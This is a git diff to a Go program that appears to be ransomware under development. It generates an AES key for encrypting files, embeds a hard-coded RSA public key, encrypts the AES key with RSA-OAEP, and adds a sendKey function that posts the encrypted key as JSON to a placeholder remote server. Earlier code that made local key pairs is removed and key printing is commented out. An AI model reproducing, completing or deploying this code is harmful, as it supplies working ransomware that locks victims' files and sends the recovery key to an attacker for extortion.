@@ -1,11 +1,18 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/rsa"
+	"crypto/x509"
+	"crypto/sha256"
+	"encoding/pem"
+	"encoding/hex"
+	"encoding/json"
 	"fmt"
+	"net/http"
 	"runtime"
 	"io"
 	"os"
@@ -13,7 +20,15 @@ import (
 
 var key []byte
 var fileSep string
-var serverPub []byte
+var serverPub = []byte(`
+-----BEGIN PUBLIC KEY-----
+MIIBCgKCAQEA3pulN61rzbvZw7gREV4+BY9V+lyUAfrecYzIupzdv/RnU1Qrgo9O
+2OGHA4wfwrXANQb1c2Zp0c7ZLTISpJaMjjhu1jrkpId7GuFYExMQEF8gxl01w2/r
+K1aHmNNMBSJQTap1F2JBw81zWq4EKMt2+Az+sLIvSRR0gZ0GrJ7Fx/zlreFu+xH8
+Vxd5Zuq711ChZB7yYYiX3/wo/0KN4CuZxPRANMmEuap964c+J/PNPFJDbqQBDEN0
+RRo7ge9eu0K2zjUGZUBmBetpPss2aagO+5+82YoRpS4m0Zza/jndv3q9zoOdivUN
+fxT6HN0CH2kRXUgFVOvae3cW3R1rPi8/cwIDAQAB
+-----END PUBLIC KEY-----`)
 
 func main() {
 
@@ -34,66 +49,50 @@ func main() {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-
+	hexKey, err := encryptKey()
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+	return
 	traverseFiles(testdir)
+	sendKey(hexKey)
 }
 
 func genKey() error {
 	key = make([]byte, 32)
 	_, err := rand.Read(key)
 
-	fmt.Println("key ", key)
-	fmt.Printf("%x ", key)
+	//fmt.Println("key ", key)
+	//fmt.Printf("%x ", key)
 	return err
 }
 
-func createClientRsa() (*rsa.PrivateKey, *rsa.PublicKey) {
-	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
-	if err != nil {
-		fmt.Println(err)
+func encryptKey() (string, error) {
+	block, _ := pem.Decode(serverPub)
+	if block == nil || block.Type != "PUBLIC KEY" {
+		fmt.Println("invalid pub key")
 		os.Exit(1)
 	}
-
-	pubKey := &privKey.PublicKey
-	return privKey, pubKey
-}
-
-func writeClientKeys(privKey *rsa.PrivateKey, pubKey *rsa.PublicKey) error {
-	//pemPrivFile, err := os.Create("private_key.pem")
-	//if err != nil {
-	//	fmt.Println(err)
-	//	return err
-	//}
-	pemPubFile, err := os.Create("public_key.pem")
+	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
 	if err != nil {
 		fmt.Println(err)
 		return err
 	}
-	// start export process
-	// var pemPrivBlock = &pem.Block{
-	// 	Type: "RSA PRIVATE KEY",
-	// 	Bytes: x509.MarshalPKCS1PrivateKey(privKey),
-	// }
-	var pemPubBlock = &pem.Block{
-		Type: "PUBLIC KEY",
-		Bytes: x509.MarshalPKCS1PublicKey(pubKey),
-	}
-	// write block to file
-	//err = pem.Encode(pemPrivFile, pemPrivBlock)
-	//if err != nil {
-	//	return err
-	//}
-	//pemPrivFile.Close()
-	err = pem.Encode(pemPubFile, pemPubBlock)
+
+	encKey, err := rsa.EncryptOAEP(
+		sha256.New(),
+		rand.Reader,
+		pub,
+		key,
+		nil)
 	if err != nil {
+		fmt.Println(err)
 		return err
 	}
-	pemPubFile.Close()
-	return nil
-}
-
-func encryptClientPriv(*rsa.PrivateKey) {
-
+	encHex := hex.EncodeToString(encKey)
+	fmt.Println(encHex)
+	return encHex, nil
 }
 
 
@@ -160,3 +159,17 @@ func encryptFile(path string) {
 	}
 }
 
+func sendKey(hexKey string) error {
+	r := map[string]string{"encKey": hexKey}
+	json_data, err := json.Marshal(r)
+	if err != nil {
+		fmt.Println(err)
+		return err
+	}
+	resp, err := http.Post("https://addr", "application/json", bytes.NewBuffer(json_data))
+	if err != nil || resp.StatusCode != 200 {
+		fmt.Println(err)
+		return err
+	}
+	return nil
+}
